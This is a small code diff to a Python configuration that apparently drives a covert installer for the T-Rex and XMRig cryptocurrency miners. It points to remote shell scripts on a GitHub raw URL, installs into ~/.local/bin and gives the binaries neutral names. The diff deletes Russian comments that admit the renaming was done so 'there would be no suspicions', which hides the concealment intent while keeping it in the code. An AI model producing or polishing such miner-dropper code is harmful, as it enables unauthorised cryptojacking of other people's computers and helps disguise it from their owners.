@@ -17,7 +17,7 @@ INSTALL_DIR = os.path.expanduser("~/.local/bin")
 TREX_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh",  # Замени
     "INSTALLER_NAME": "install_t.sh",
-    "BINARY_NAME": "TREX_BIN",  # Новое имя, чтобы не было подозрений
+    "BINARY_NAME": "TREX_BIN",
     "LOG_FILE": "t.log",
     "API_PORT": 60000,
     "API_TYPE": "trex"
@@ -26,7 +26,7 @@ TREX_CONFIG = {
 XMRIG_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh",  # Замени
     "INSTALLER_NAME": "install_x.sh",
-    "BINARY_NAME": "XMRIG_BIN",  # Новое имя
+    "BINARY_NAME": "XMRIG_BIN",
     "LOG_FILE": "x.log",
     "API_PORT": 60001,
     "API_TYPE": "xmrig"
